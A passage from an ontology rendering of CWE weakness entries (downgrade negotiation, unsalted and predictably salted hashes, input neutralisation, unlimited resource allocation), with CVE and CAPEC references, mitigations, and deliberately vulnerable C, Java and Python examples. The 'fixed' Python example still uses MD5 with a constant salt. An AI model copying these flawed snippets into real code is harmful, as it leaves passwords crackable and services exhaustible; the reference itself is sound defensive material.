     Annotations: rdfs:comment "Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash."^^xsd:string
                 
                 references  CVE-2008-4302,
     ID  "755"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-757_Selection_of_Less-Secure_Algorithm_During_Negotiation

    Annotations: 
        rdfs:comment "A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties."^^xsd:string,
        rdfs:comment "When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the software by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Telnet protocol implementation allows downgrade to weaker authentication and encryption using a man-in-the-middle attack."^^xsd:string
                 
                 references  CVE-2001-1444,
     
     Annotations: rdfs:comment "SSH server implementation allows override of configuration setting to use weaker authentication schemes. This may be a composite with CWE-642."^^xsd:string
                 
                 references  CVE-2002-1646,
     
     Annotations: rdfs:comment "chain: SSL/TLS implementation disables a verification step (CWE-325) that enables a downgrade attack to a weaker protocol."^^xsd:string
                 
                 references  CVE-2005-2969,
     
     Annotations: rdfs:comment "Attacker can select an older version of the software to exploit its vulnerabilities."^^xsd:string
                 
                 references  CVE-2006-4302,
     
     Annotations: rdfs:comment "Improper prioritization of encryption ciphers during negotiation leads to use of a weaker cipher."^^xsd:string
                 
                 references  CVE-2006-4407,
     
     Annotations: rdfs:comment "Client-Server Protocol Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-220,
     
     Annotations: rdfs:comment "Weakening of Cellular Encryption"^^xsd:string
                 
                 related_attack_patterns  CAPEC-606,
     
     Annotations: rdfs:comment "Drop Encryption Level"^^xsd:string
                 
                 related_attack_patterns  CAPEC-620,
     ID  "757"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-759_Use_of_a_One-Way_Hash_without_a_Salt

    Annotations: 
        rdfs:comment "Background Details:
In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult."^^xsd:string,
        rdfs:comment "The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input."^^xsd:string,
        rdfs:comment "This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.

It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Router does not use a salt with a hash, making it easier to crack passwords."^^xsd:string
                 
                 references  CVE-2006-1058,
     
     Annotations: rdfs:comment "Router does not use a salt with a hash, making it easier to crack passwords."^^xsd:string
                 
                 references  CVE-2008-1526,
     ID  "759"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.
Effectiveness: Limited

Note: Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware."^^xsd:string, 
                 rdfs:comment "Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.
Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.
Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "If an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In both of these examples, a user is logged in if their given password matches a stored password:

(bad code)
Example Language: C 
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... );
//Login if hash matches stored hash 
if (equal(ctext, secret_password())) {
login_user();
}
}
(bad code)
Example Language: Java 
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(\"SHA\");
encer.update(plainTextIn);
byte[] digest = password.digest();
//Login if hash matches stored hash 
if (equal(digest,secret_password())) {
login_user();
}
This code does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password. Note this code also exhibits CWE-328 (Reversible One-Way Hash)."^^xsd:string, 
                 rdfs:comment "Example 2
In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.

(bad code)
Example Language: Python 
def storePassword(userName,Password):
hasher = hashlib.new('md5')
hasher.update(Password)
hashedPassword = hasher.digest()

# UpdateUserLogin returns True on success, False otherwise 
return updateUserLogin(userName,hashedPassword)
While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised.

Fixing this is as simple as providing a salt to the hashing function on initialization:

(good code)
Example Language: Python 
def storePassword(userName,Password):
hasher = hashlib.new('md5',b'SaltGoesHere')
hasher.update(Password)
hashedPassword = hasher.digest()

# UpdateUserLogin returns True on success, False otherwise 
return updateUserLogin(userName,hashedPassword)
Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Configuration Checker
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "nalysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-75_Failure_to_Sanitize_Special_Elements_into_a_Different_Plane

    Annotations: 
        rdfs:comment "The software does not adequately filter user-controlled input for special elements with control implications."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Web Logs Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-81,
     
     Annotations: rdfs:comment "Log Injection-Tampering-Forging"^^xsd:string
                 
                 related_attack_patterns  CAPEC-93,
     ID  "75"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Utilize an appropriate mix of whitelist and blacklist parsing to filter special element syntax from all input."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Programming languages and supporting technologies might be chosen which are not subject to these issues."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-760_Use_of_a_One-Way_Hash_with_a_Predictable_Salt

    Annotations: 
        rdfs:comment "Background Details:
In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult."^^xsd:string,
        rdfs:comment "The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software uses a predictable salt as part of the input."^^xsd:string,
        rdfs:comment "This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.

It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Server uses a constant salt when encrypting passwords, simplifying brute force attacks."^^xsd:string
                 
                 references  CVE-2001-0967,
     
     Annotations: rdfs:comment "Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks."^^xsd:string
                 
                 references  CVE-2002-1657,
     
     Annotations: rdfs:comment "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass."^^xsd:string
                 
                 references  CVE-2005-0408,
     
     Annotations: rdfs:comment "Blogging software uses a hard-coded salt when calculating a password hash."^^xsd:string
                 
                 references  CVE-2008-4905,
     ID  "760"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.
Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.
Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
Effectiveness: High"^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.
Effectiveness: Limited

Note: Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-76_Improper_Neutralization_of_Equivalent_Special_Elements

    Annotations: 
        rdfs:comment "The software may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the software may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the software might filter a dangerous \"-e\" command-line switch when calling an external program, but it might not account for \"--exec\" or other switches that have the same semantics."^^xsd:string,
        rdfs:comment "The software properly neutralizes certain special elements, but it improperly neutralizes equivalent special elements."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "76"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Utilize an appropriate mix of whitelist and blacklist parsing to filter equivalent special element syntax from all input."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Programming languages and supporting technologies might be chosen which are not subject to these issues."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-770_Allocation_of_Resources_Without_Limits_or_Throttling

    Annotations: 
        rdfs:comment "Maintenance:
\"Resource exhaustion\" (CWE-400) is currently treated as a weakness, although it is more like a category of weaknesses that all have the same type of consequence. While this entry treats CWE-400 as a parent in view 1000, the relationship is probably more appropriately described as a chain."^^xsd:string,
        rdfs:comment "The software allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."^^xsd:string,
        rdfs:comment "Theoretical:
Vulnerability theory is largely about how behaviors and resources interact. \"Resource exhaustion\" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "CMS does not restrict the number of searches that can occur simultaneously, leading to resource exhaustion."^^xsd:string
                 
                 references  CVE-2005-4650,
     
     Annotations: rdfs:comment "Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window."^^xsd:string
                 
                 references  CVE-2008-1700,
     
     Annotations: rdfs:comment "Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created."^^xsd:string
                 
                 references  CVE-2008-5180,
     
     Annotations: rdfs:comment "Product allows exhaustion of file descriptors when processing a large number of TCP packets."^^xsd:string
                 
                 references  CVE-2009-2054,
     
     Annotations: rdfs:comment "Large integer value for a length property in an object causes a large amount of memory allocation."^^xsd:string
                 
                 references  CVE-2009-2540,
     
     Annotations: rdfs:comment "Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption."^^xsd:string
                 
                 references  CVE-2009-2726,
     
     Annotations: rdfs:comment "Language interpreter does not restrict the number of temporary files being created when handling a MIME request with a large number of parts."^^xsd:string
                 
                 references  CVE-2009-4017,
     
     Annotations: rdfs:comment "Exploit Test APIs"^^xsd:string
                 
                 related_attack_patterns  CAPEC-121,
     
     Annotations: rdfs:comment "Flooding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-125,
     
     Annotations: rdfs:comment "Excessive Allocation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-130,
     
     Annotations: rdfs:comment "XML Ping of the Death"^^xsd:string
                 
                 related_attack_patterns  CAPEC-147,
     
     Annotations: rdfs:comment "XML Entity Expansion"^^xsd:string
                 
                 related_attack_patterns  CAPEC-197,
     
     Annotations: rdfs:comment "XML Attribute Blowup"^^xsd:string
                 
                 related_attack_patterns  CAPEC-229,
     
     Annotations: rdfs:comment "XML Nested Payloads"^^xsd:string
                 
                 related_attack_patterns  CAPEC-230,
     
     Annotations: rdfs:comment "XML Oversized Payloads"^^xsd:string
                 
                 related_attack_patterns  CAPEC-231,
     
     Annotations: rdfs:comment "HTTP DoS"^^xsd:string
                 
                 related_attack_patterns  CAPEC-469,
     
     Annotations: rdfs:comment "Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))"^^xsd:string
                 
                 related_attack_patterns  CAPEC-82,
     
     Annotations: rdfs:comment "XML Parser Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-99,
     ID  "770"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold."^^xsd:string, 
                 rdfs:comment "Ensure that protocols have specific limits of scale placed on them."^^xsd:string, 
                 rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.
Ensure that all failures in resource allocation place the system into a safe posture."^^xsd:string, 
                 rdfs:comment "Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410."^^xsd:string, 
                 rdfs:comment "Mitigation of resource exhaustion attacks requires that the target system either:
- recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays
- uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.
The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.
The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Resource Limitation
Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.
When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.
Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     availability  "DoS: Resource Consumption (Memory)"^^xsd:string,
     availability  "DoS: Resource Consumption (Other)"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code allocates a socket and forks each time it receives a new connection.

Example Language: C  /* (bad code) */
sock=socket(AF_INET, SOCK_STREAM, 0);
while (1) {
newsock=accept(sock, ...);
printf(\"A connection has been accepted\\n\");
pid = fork();
}
The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely."^^xsd:string, 
                 rdfs:comment "Example 2
In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.

Example Language: C  /* (bad code) */
int writeDataFromSocketToFile(char *host, int port)
{

char filename[FILENAME_SIZE];
char buffer[BUFFER_SIZE];
int socket = openSocketConnection(host, port);

if (socket < 0) {
printf(\"Unable to open socket connection\");
return(FAIL);
}
if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {
if (openFileToWrite(filename) > 0) {
while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){
if (!(writeToFile(buffer) > 0))
break;
}
}
closeFile();
}
closeSocket(socket);
}
This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service."^^xsd:string, 
                 rdfs:comment "Example 3
In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.

(bad code)
Example Language: C 

/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */ 
int processMessage(char **message)
{
char *body;

int length = getMessageLength(message[0]);

if (length > 0) {
body = &message[1][0];
processMessageBody(body);
return(SUCCESS);
}
else {
printf(\"Unable to process message; invalid message length\");
return(FAIL);
}
}
This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check

Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.

(good code)
Example Language: C 
unsigned int length = getMessageLength(message[0]);
if ((length > 0) && (length < MAX_LENGTH)) {...}"^^xsd:string, 
                 rdfs:comment "Example 4
In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.

(bad code)
Example Language: Java 
public void acceptConnections() {
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + \":\" + counter++);
t.start();
}
serverSocket.close();


} catch (IOException ex) {...}
}
In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.

The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.

(good code)
